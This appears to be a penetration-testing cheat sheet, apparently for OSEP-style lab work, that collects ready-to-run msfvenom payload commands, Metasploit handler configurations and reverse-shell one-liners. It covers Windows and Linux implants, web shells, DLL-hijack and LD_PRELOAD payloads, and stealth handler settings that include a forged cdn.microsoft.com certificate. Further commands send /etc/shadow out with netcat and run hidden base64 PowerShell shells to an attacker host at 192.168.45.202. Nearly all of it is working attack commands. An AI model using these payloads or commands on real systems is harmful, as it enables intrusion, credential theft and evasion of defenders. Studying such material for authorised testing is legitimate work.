# Msfvenom & Listener Master Reference

All payload generation and handler configurations in one place.

---

## Msfvenom Payload Reference

### Windows — Staged (Requires Handler Running)

```bash
# 64-bit staged reverse TCP (classic, highly detected):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f exe -o shell.exe

# 64-bit staged reverse HTTPS (blends with web traffic):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f exe -o shell.exe

# PowerShell one-liner (staged, loads from memory):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f ps1 -o shell.ps1
```

### Windows — Stageless (Self-Contained, More Reliable Through Firewalls)

```bash
# 64-bit stageless HTTPS (recommended for restricted networks):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f exe -o stageless.exe

# 64-bit stageless TCP:
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f exe -o stageless.exe

# 32-bit (for WOW64 or old targets):
msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f exe -o stageless_x86.exe

# Raw shellcode (for custom loaders — most important for OSEP):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f raw -o shell.bin
# OR for loaders that expect a C array:
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f cs -o shellcode.cs
```

### Windows — Service / DLL Formats

```bash
# Windows Service EXE (for PSExec-style delivery):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f exe-service -o svc.exe

# DLL (for reflective loading or DLL hijacking):
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f dll -o payload.dll
# 32-bit DLL (for 32-bit injection targets):
msfvenom -p windows/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f dll -o payload_x86.dll

# DLL for DLL hijacking — match exported function names from legitimate DLL:
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.202 LPORT=443 -f dll -e x64/xor_dynamic -o hijack.dll
```

### Linux Payloads

```bash
# 64-bit ELF reverse TCP:
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f elf -o shell

# 64-bit shell (no meterpreter — just a shell):
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f elf -o shell

# Raw shellcode for Linux custom loaders:
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f raw -o shell.bin

# Shared library (for LD_PRELOAD abuse):
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f elf-so -o evil.so
```

### Other Formats

```bash
# PowerShell script (staged — runs in PS):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f psh-reflection -o payload.ps1

# HTA (HTML Application — for browser/email delivery):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f hta-psh -o payload.hta

# ASP (for web shells):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f asp -o shell.asp

# ASPX (for .NET web apps):
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.202 LPORT=443 -f aspx -o shell.aspx

# JSP (for Java web apps / Tomcat):
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f jsp -o shell.jsp

# WAR (for Tomcat manager upload):
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -f war -o shell.war
```

---

## Listener Handlers (msfconsole)

### Basic Handlers

```bash
# Start MSF:
msfconsole -q

# Staged HTTPS handler:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 192.168.45.202
set LPORT 443
run -j    # -j = background as job

# Stageless HTTPS handler:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.45.202
set LPORT 443
run -j

# TCP handler:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.45.202
set LPORT 4444
run -j

# Linux handler:
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST 192.168.45.202
set LPORT 4444
run -j
```

### Stealth Handler Options

```bash
# Custom User-Agent (stageless HTTPS blends with browser traffic):
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.45.202
set LPORT 443
set HandlerSSLCert /path/to/cert.pem     # use real cert if you have one
set StagerVerifySSLCert false
set MeterpreterUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
run -j

# With custom HTTP headers:
set HttpUnknownRequestResponse "<html><head><title>404 Not Found</title></head><body>Not Found</body></html>"
set MeterpreterServerName Apache

# Avoid SSL cert mismatch alerts:
# Generate a self-signed cert matching a real domain:
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes \
    -subj "/CN=cdn.microsoft.com/O=Microsoft/C=US"
cat server.key server.crt > cert.pem
set HandlerSSLCert cert.pem
```

### Handler RC File (Auto-start on reboot)

```bash
# Save handler config to an rc file:
cat > /tmp/handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_https
set LHOST 192.168.45.202
set LPORT 443
set ExitOnSession false
run -j -z
EOF

# Start MSF with the rc file:
msfconsole -q -r /tmp/handler.rc
```

---

## Netcat Listeners (Simple Shell)

```bash
# Listen for simple shell:
nc -lvp 4444

# Netcat one-liner listener that keeps running after disconnect:
while true; do nc -lvp 4444; done

# nc send a file (exfil):
# Receiver:
nc -lvp 4444 > received_file
# Sender:
nc 192.168.45.202 4444 < /etc/shadow
```

---

## Reverse Shell One-Liners (No Meterpreter)

Use when you can't run msfvenom payloads or need a quick shell.

### PowerShell

```powershell
# Full TCP client shell:
$c=New-Object Net.Sockets.TCPClient('192.168.45.202',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$ob=[text.encoding]::ASCII.GetBytes($o+' PS> ');$s.Write($ob,0,$ob.Length)};$c.Close()

# Base64 encoded (for command-line delivery):
# Encode first:
$cmd = '$c=New-Object Net.Sockets.TCPClient("192.168.45.202",4444);...'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$b64 = [System.Convert]::ToBase64String($bytes)
# Then use: powershell -w hidden -enc $b64
```

### Bash

```bash
bash -i >& /dev/tcp/192.168.45.202/4444 0>&1

# Alternative (if /dev/tcp is disabled):
exec 5<>/dev/tcp/192.168.45.202/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Through ncat (if available):
ncat 192.168.45.202 4444 -e /bin/bash
```

### Python

```bash
# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.202",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.202",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Post-Connection: Upgrade a Raw Shell

```bash
# Got a basic nc shell? Upgrade to full TTY:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → reset

# Upgrade to Meterpreter from raw shell:
# In msfconsole:
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

---

## Quick Reference: Format by Delivery Method

```
Delivery Method             Format           Payload Type
─────────────────────────────────────────────────────────────────
Custom loader / C#          -f raw           stageless (no stager)
Loader (C array)            -f cs            stageless
PowerShell IEX              -f ps1           staged or stageless
Browser / email             -f hta-psh       staged/stageless
Web shell (IIS)             -f aspx          staged
Web shell (Apache PHP)      -f raw + base64  staged (custom)
Tomcat                      -f war           staged
Service install             -f exe-service   staged or stageless
DLL hijacking               -f dll           staged or stageless
Direct run                  -f exe           staged or stageless
```
